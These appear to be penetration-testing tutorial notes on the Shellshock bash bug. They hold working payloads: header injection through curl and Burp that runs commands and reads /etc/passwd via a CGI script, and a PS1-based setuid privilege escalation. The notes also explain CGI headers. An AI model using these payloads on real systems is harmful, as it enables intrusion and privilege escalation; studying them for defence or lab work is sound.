#### CGI-BIN Shellshock

To understand shellshock few blogs can be referred such as [ShellShocked – A quick demo of how easy it is to exploit](https://www.surevine.com/shellshocked-a-quick-demo-of-how-easy-it-is-to-exploit/) , [Inside Shellshock: How hackers are using it to exploit systems](https://blog.cloudflare.com/inside-shellshock/)

```
curl -H "User-Agent: () { :; }; echo 'Content-type: text/html'; echo; /bin/cat /etc/passwd" http://192.168.56.2:591/cgi-bin/cat
```

alternative

```
In the user agent in burp

() { :; }; echo; echo; /usr/bin/whoami
```





It is important to understand what is cgi-bin which can be read from [Creating CGI Programs with Bash: Getting Started](http://www.team2053.org/docs/bashcgi/gettingstarted.html). Also the most important lines in this file are:

```
echo "Content-type: text/html"
echo ""
```

These two lines tell your browser that the rest of the content coming from the program is HTML, and should be treated as such. Leaving these lines out will often cause your browser to download the output of the program to disk as a text file instead of displaying it, since it doesn’t understand that it is HTML!

**Shellshock Local Privilege Escalation**

Binaries with a setuid bit and calling \(directly or indirectly\) bash through execve, popen or system are tools which may be used to activate the Shell Shock bug.

```
sudo PS1="() { :;} ;  /bin/sh" /home/username/suidbinary
```

Shellshock also affects DHCP as mentioned [Shellshock DHCP RCE Proof of Concept](https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/). There’s a metasploit module named “Dhclient Bash Environment Variable Injection \(Shellshock\)” for this.

